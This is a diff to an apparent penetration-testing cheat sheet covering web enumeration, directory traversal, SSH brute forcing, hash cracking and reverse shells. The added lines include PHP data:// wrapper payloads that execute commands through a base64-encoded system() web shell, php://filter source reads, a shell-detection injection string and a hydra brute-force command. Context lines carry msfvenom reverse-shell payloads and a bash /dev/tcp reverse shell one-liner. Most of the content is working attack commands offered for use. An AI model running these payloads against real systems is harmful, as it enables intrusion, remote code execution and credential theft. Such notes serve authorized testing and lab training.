@@ -53,14 +53,24 @@ Resources:
 - https://github.com/riramar/Web-Attack-Cheat-Sheet
 
 ### File/Directory Enumeration
+**Outer-URL**
+Remove `asp`/`aspx` for Linux hosts
+- https://epi052.github.io/feroxbuster-docs/docs/configuration/command-line/
+- `-f` can cause a ton of false positives
+- `-n` stops recursive directory lookups
 ```
-feroxbuster -u http://host.domain.tld -f -n -C 404 -A -e -S 0 --auto-tune
-feroxbuster -u http://host.domain.tld -x html,php,txt -C 404 -A -e -S 0 --auto-tune
-feroxbuster -u http://host.domain.tld/cgi-bin -x cgi,pl,py,sh -C 404 -A -e -S 0 --auto-tune
-feroxbuster -u http://host.domain.tld -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --auto-tune
-feroxbuster -u http://host.domain.tld -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --auto-tune
+feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 --thorough --burp-replay --dont-scan Css Js css img js IMG JS Img CSS fonts Fonts master
+feroxbuster -u http://host.domain.tld:80/ -x asp,aspx,html,php,xml,json,txt -C 404 -A -e -S 0 --thorough --burp-replay
+feroxbuster -u http://host.domain.tld/cgi-bin:80/ -x cgi,pl,py,sh -C 404 -A -e -S 0 --thorough --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --thorough --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --thorough --burp-replay
 ```
-- .asp, .aspx
+**Inner-URL**
+
+Such as APIs `v1`, `v2`, etc.
+```
+ffuf -u 'http://host.domain.tld/FUZZ/v1' -w '/usr/share/wordlists/dirb/big.txt' -r http://127.0.0.1:8080
+```
 ### Virtual Host (subdomain) Enumeration
 ```
 gobuster vhost -u host.domain.tld -w '/usr/share/wordlists/amass/subdomains-top1mil-5000.txt' -t 50 --append-domain 
@@ -82,9 +92,9 @@ arjun -u 'http://host.domain.tld?id=1' --stable
 - `C:\inetpub\wwwroot`
 - ?param=phpinfo();
 - https://gist.github.com/jonlabelle/3f9aa4a5f3a2e41b7b4a81232047435c
-
+- Modify `match.py` to meet the needs (OS, `file://`, etc.)
 ```
-python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/directory_traversal_1.php?page=/etc/passwd' --string '/etc/passwd' --cookie 'PHPSESSID=<ID>; security_level=3'
+python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/directory_traversal_1.php?page=/etc/passwd' --string 'etc/passwd' -v --depth 12 --cookie 'PHPSESSID=<ID>; security_level=3'
 ```
 ### Vulnerability Scanning
 - https://github.com/sullo/nikto
@@ -93,6 +103,7 @@ python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/d
 nikto -host='http://host.domain.tld'
 ```
 ### SQL Injection
+- Check to see if the form/input actually goes anywhere (isn't fake)
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
 ### Bypass 403
 - https://github.com/iamj0ker/bypass-403
@@ -109,12 +120,41 @@ People:
 ### Sensitive Information
 ```
 curl 'http://host/domain.tld/index.html' | grep -oE '\w+' | sort -u -f | more
-cewl
+cewl -u 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' http://host.domain.tld --depth 5 -a --with-numbers -m 6 --exclude './cewl_Exclude.txt'
 ```
 ### IIS
 **WebDAV**
 ```
 nmap host.domain.tld -p 80 -Pn --script http-iis-webdav-vuln -e tun0
+```
+### XSS
+- Common characters to check for sanitization: `< > ' " { } ;-#=TICK/\`
+- https://jscompress.com/*
+- Check to see if the form/input actually goes anywhere (isn't fake)
+### PHP Wrappers
+Search if `<body>` or `<html>` is not closed
+
+**Read**
+```
+http://host.domain.tld/index.php?page=php://filter/resource=db.php
+http://host.domain.tld/index.php?page=php://filter/convert.base64-encode/resource=db.php
+```
+**Execute**
+- URL encoding and base64 will usually be required
+```
+http://host.domain.tld/index.php?page=data://text/plain,<?php echo system($_GET["ls"]);?>
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+http://host.domain.tld/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+```
+### File Uploads
+- `/uploads` directory usually
+- php, phps, php7, pHp
+- Attempt to upload the same file twice  l
+### Code Injection
+Check if CMD or PowerShell
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 ## Linux/UNIX Security
 Your content here
@@ -145,6 +185,11 @@ mysql -u 'User' -p'Password123!' -h host.domain.tld
 ```
 ## Windows and AD Security
 Your content here
+- https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
+- https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
+- https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a
+- https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
+- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
 ### Anonymous
 Your content here
 #### DNS
@@ -380,12 +425,9 @@ patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password='' 
 ### SSH
 ```
 patator ssh_login host=host.domain.tld user='User' password='Password123!' port=22 --max-retries=0 --csv='patator_ssh_single.csv'
-```
-```
 patator ssh_login host=host.domain.tld password='Password123!' port=22 user=FILE0 0='/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt' --max-retries=0 --csv='patator_ssh_user.csv'
-```
-```
 patator ssh_login host=host.domain.tld user='User' port=22 password=FILE0 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='ssh_pass.csv'
+sudo hydra -l 'User' -P '/usr/share/wordlists/rockyou.txt' -s 22 ssh://host.domain.tld
 ```
 ### SMTP
 ```
@@ -396,7 +438,7 @@ patator ssh_login host=host.domain.tld user='User' port=22 password=FILE0 0='/us
 ```
 onesixtyone host.domain.tld -c '/usr/share/wordlists/metasploit/snmp_default_pass.txt'
 ```
-## Hashcat/John
+## Data Concealment
 NameThatHash (nth)
 
 **NetNTLMv2**
@@ -425,9 +467,9 @@ sort -u 'Hashcat_PW_Output_Dupped.txt' 'Hashcat_PW_Output_Unique.txt'
 zip2john 'File.zip' > 'John_Zip_Hash.txt'
 john --wordlist='/usr/share/wordlists/rockyou.txt' 'John_Zip_Hash.txt'
 ```
-## Data Obfusication
-Your content here
+
 **Base64 String Decode**
+- https://gchq.github.io/CyberChef/
 ```
 echo 'acd==' | base64 -d
 ```
@@ -439,12 +481,17 @@ exiftool file.txt
 ## Malware/Exploits
 - Word > Insert > Quick Parts > Field > Links and References > Include picture > http://#.#.#.#/canary.jpg
 	- Works on WordPad and Office (licensing problems)
-### Reverse Shell
+### Reverse Shells
+- https://www.revshells.com/
 ```
 msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f hta-psh LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.hta'
 msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.dll'
 sudo nc -nlvp 9000
 "bash -c 'bash -i >& /dev/tcp/#.#.#.#/#### 0>&1'"
+```
+### Web Shells
+```
+/usr/share/webshells
 ```
 ### Exploit
 - https://www.exploit-db.com/
@@ -487,12 +534,15 @@ After running the code, execute debugging commands during the debug break:
 ```
 print var
 ```
+**requests Library**
+- https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
 ### Firefox Customization
 Extensions
 - https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/
 - https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 - https://addons.mozilla.org/en-US/firefox/addon/darkreader/
 - https://addons.mozilla.org/en-US/firefox/addon/markdown-viewer-chrome/
+- https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
 ### Add Source
 The following method avoids the `apt-key` deprecation warning:
 ```
